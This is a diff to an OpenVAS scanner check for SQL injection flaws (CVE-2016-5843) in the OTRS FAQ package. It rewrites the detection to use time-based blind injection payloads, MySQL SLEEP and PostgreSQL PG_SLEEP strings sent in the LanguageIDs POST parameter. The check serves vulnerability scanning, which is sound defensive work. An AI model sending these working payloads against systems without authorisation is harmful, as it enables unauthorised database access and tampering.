@@ -1,6 +1,6 @@
 ###############################################################################
 # OpenVAS Vulnerability Test
-# $Id: gb_otrs_faq_sql_inj_vuln.nasl 11464 2018-09-19 08:52:50Z cfischer $
+# $Id: gb_otrs_faq_sql_inj_vuln.nasl 12243 2018-11-07 11:08:47Z cfischer $
 #
 # OTRS FAQ Package Multiple SQL Injection Vulnerability
 #
@@ -30,26 +30,20 @@ CPE = "cpe:/a:otrs:otrs";
 if(description)
 {
   script_oid("1.3.6.1.4.1.25623.1.0.106290");
-  script_version("$Revision: 11464 $");
-  script_tag(name:"last_modification", value:"$Date: 2018-09-19 10:52:50 +0200 (Wed, 19 Sep 2018) $");
+  script_version("$Revision: 12243 $");
+  script_cve_id("CVE-2016-5843");
+  script_tag(name:"last_modification", value:"$Date: 2018-11-07 12:08:47 +0100 (Wed, 07 Nov 2018) $");
   script_tag(name:"creation_date", value:"2016-09-27 11:26:32 +0700 (Tue, 27 Sep 2016)");
   script_tag(name:"cvss_base", value:"9.0");
   script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:P/A:P");
-
-  script_cve_id("CVE-2016-5843");
-
-  script_tag(name:"qod_type", value:"remote_analysis");
-
-  script_tag(name:"solution_type", value:"VendorFix");
-
   script_name("OTRS FAQ Package Multiple SQL Injection Vulnerability");
-
   script_category(ACT_ATTACK);
-
   script_copyright("This script is Copyright (C) 2016 Greenbone Networks GmbH");
   script_family("Web application abuses");
   script_dependencies("secpod_otrs_detect.nasl");
   script_mandatory_keys("OTRS/installed");
+
+  script_xref(name:"URL", value:"https://www.otrs.com/security-advisory-2016-01-security-update-otrs-faq-package/");
 
   script_tag(name:"summary", value:"The FAQ package of OTRS is prone to multiple SQL injection
   vulnerabilities.");
@@ -61,9 +55,10 @@ if(description)
 
   script_tag(name:"impact", value:"An attacker could access and manipulate the database with an HTTP request.");
 
-  script_tag(name:"solution", value:"Upgrade to FAQ 5.0.5, 4.0.5, 2.3.6 or later.");
+  script_tag(name:"solution", value:"Upgrade the FAQ package to version 5.0.5, 4.0.5, 2.3.6 or later.");
 
-  script_xref(name:"URL", value:"https://www.otrs.com/security-advisory-2016-01-security-update-otrs-faq-package/");
+  script_tag(name:"qod_type", value:"remote_analysis");
+  script_tag(name:"solution_type", value:"VendorFix");
 
   exit(0);
 }
@@ -93,67 +88,61 @@ latency = stop - start;
 
 url = dir + '/public.pl';
 
-# There are some FAQ articles, so check with a ASCII() Injection
-if ("Latest created FAQ articles" >< res) {
-  # we try max 4 language IDs
-  for (i=66; i<70; i++) {
-    data = "Action=PublicFAQSearch&Subaction=Search&Number=&Fulltext=&Title=&Keyword=&LanguageIDs=" +
-           i + "-ASCII('A')&VoteSearchOption=&VoteSearchType=Equals&VoteSearch=&RateSearchOption=" +
-           "&RateSearchType=Equals&RateSearch=0&TimeSearchType=&ItemCreateTimePointStart=Last" +
-           "&ItemCreateTimePoint=1&ItemCreateTimePointFormat=day&ItemCreateTimeStartMonth=8" +
-           "&ItemCreateTimeStartDay=28&ItemCreateTimeStartYear=2016&ItemCreateTimeStopMonth=9" +
-           "&ItemCreateTimeStopDay=27&ItemCreateTimeStopYear=2016&ResultForm=Normal";
+count = 0;
 
-    req = http_post_req(port: port, url: url, data: data,
-                      add_headers: make_array("Content-Type","application/x-www-form-urlencoded"));
-    res = http_keepalive_send_recv(port: port, data: req);
+foreach sleep (make_list(3, 5, 7)) {
 
-    if (res && res =~ "^HTTP/1\.[01] 200" && "<title>Search FAQ" >< res && "No FAQ data found" >!< res ) {
-      report = 'It was possible to conduct a blind SQL-Injection into the "LanguageIDs" parameter via a crafted POST request to the following URL:\n\n' + report_vuln_url(url: url, port: port, url_only: TRUE);
-      security_message(port: port, data: report);
-      exit(0);
-    }
+  # MySQL
+  query = "2) AND (SELECT * FROM (SELECT(SLEEP(" + sleep + ")))nwrQ) AND (4570=4570";
+  data = "Action=PublicFAQSearch&Subaction=Search&Number=&Fulltext=&Title=&Keyword=&LanguageIDs=" +
+          query + "&VoteSearchOption=&VoteSearchType=Equals&VoteSearch=&RateSearchOption=" +
+          "&RateSearchType=Equals&RateSearch=0&TimeSearchType=&ItemCreateTimePointStart=Last" +
+          "&ItemCreateTimePoint=1&ItemCreateTimePointFormat=day&ItemCreateTimeStartMonth=8" +
+          "&ItemCreateTimeStartDay=28&ItemCreateTimeStartYear=2016&ItemCreateTimeStopMonth=9" +
+          "&ItemCreateTimeStopDay=27&ItemCreateTimeStopYear=2016&ResultForm=Normal";
+  req = http_post_req(port: port, url: url, data: data,
+                      add_headers: make_array("Content-Type", "application/x-www-form-urlencoded"));
+  start = unixtime();
+  res = http_keepalive_send_recv(port: port, data: req);
+  stop = unixtime();
+
+  time = stop - start;
+  if (time >= sleep && time <= (sleep + latency)) {
+    count++;
   }
-  exit(0);
 }
 
-# MySQL
-query = "2) AND (SELECT * FROM (SELECT(SLEEP(5)))nwrQ) AND (4570=4570";
-data = "Action=PublicFAQSearch&Subaction=Search&Number=&Fulltext=&Title=&Keyword=&LanguageIDs=" +
-        query + "&VoteSearchOption=&VoteSearchType=Equals&VoteSearch=&RateSearchOption=" +
-        "&RateSearchType=Equals&RateSearch=0&TimeSearchType=&ItemCreateTimePointStart=Last" +
-        "&ItemCreateTimePoint=1&ItemCreateTimePointFormat=day&ItemCreateTimeStartMonth=8" +
-        "&ItemCreateTimeStartDay=28&ItemCreateTimeStartYear=2016&ItemCreateTimeStopMonth=9" +
-        "&ItemCreateTimeStopDay=27&ItemCreateTimeStopYear=2016&ResultForm=Normal";
-req = http_post_req(port: port, url: url, data: data,
-                      add_headers: make_array("Content-Type","application/x-www-form-urlencoded"));
-start = unixtime();
-res = http_keepalive_send_recv(port: port, data: req);
-stop = unixtime();
-
-time = stop - start;
-if (time >= 5 && time <= (5 + latency)) {
+if (count >= 2) {
   report = 'It was possible to conduct a blind SQL-Injection (MySQL: sleep) into the "LanguageIDs" parameter via a crafted POST request to the following URL:\n\n' + report_vuln_url(url: url, port: port, url_only: TRUE);
   security_message(port: port, data: report);
   exit(0);
 }
 
-# PostgreSQL
-query = "2) AND 9372=(SELECT 9372 FROM PG_SLEEP(5)) AND (4256=4256";
-data = "Action=PublicFAQSearch&Subaction=Search&Number=&Fulltext=&Title=&Keyword=&LanguageIDs=" +
-        query + "&VoteSearchOption=&VoteSearchType=Equals&VoteSearch=&RateSearchOption=" +
-        "&RateSearchType=Equals&RateSearch=0&TimeSearchType=&ItemCreateTimePointStart=Last" +
-        "&ItemCreateTimePoint=1&ItemCreateTimePointFormat=day&ItemCreateTimeStartMonth=8" +
-        "&ItemCreateTimeStartDay=28&ItemCreateTimeStartYear=2016&ItemCreateTimeStopMonth=9" +
-        "&ItemCreateTimeStopDay=27&ItemCreateTimeStopYear=2016&ResultForm=Normal";
-req = http_post_req(port: port, url: url, data: data,
-                      add_headers: make_array("Content-Type","application/x-www-form-urlencoded"));
-start = unixtime();
-res = http_keepalive_send_recv(port: port, data: req);
-stop = unixtime();
+count = 0;
 
-time = stop - start;
-if (time >= 5 && time <= (5 + latency)) {
+foreach sleep (make_list(3, 5, 7)) {
+
+  # PostgreSQL
+  query = "2) AND 9372=(SELECT 9372 FROM PG_SLEEP(" + sleep + ")) AND (4256=4256";
+  data = "Action=PublicFAQSearch&Subaction=Search&Number=&Fulltext=&Title=&Keyword=&LanguageIDs=" +
+          query + "&VoteSearchOption=&VoteSearchType=Equals&VoteSearch=&RateSearchOption=" +
+          "&RateSearchType=Equals&RateSearch=0&TimeSearchType=&ItemCreateTimePointStart=Last" +
+          "&ItemCreateTimePoint=1&ItemCreateTimePointFormat=day&ItemCreateTimeStartMonth=8" +
+          "&ItemCreateTimeStartDay=28&ItemCreateTimeStartYear=2016&ItemCreateTimeStopMonth=9" +
+          "&ItemCreateTimeStopDay=27&ItemCreateTimeStopYear=2016&ResultForm=Normal";
+  req = http_post_req(port: port, url: url, data: data,
+                      add_headers: make_array("Content-Type", "application/x-www-form-urlencoded"));
+  start = unixtime();
+  res = http_keepalive_send_recv(port: port, data: req);
+  stop = unixtime();
+
+  time = stop - start;
+  if (time >= sleep && time <= (sleep + latency)) {
+    count++;
+  }
+}
+
+if (count >= 2) {
   report = 'It was possible to conduct a blind SQL-Injection (PostgreSQL: pg_sleep) into the "LanguageIDs" parameter via a crafted POST request to the following URL:\n\n' + report_vuln_url(url: url, port: port, url_only: TRUE);
   security_message(port: port, data: report);
   exit(0);
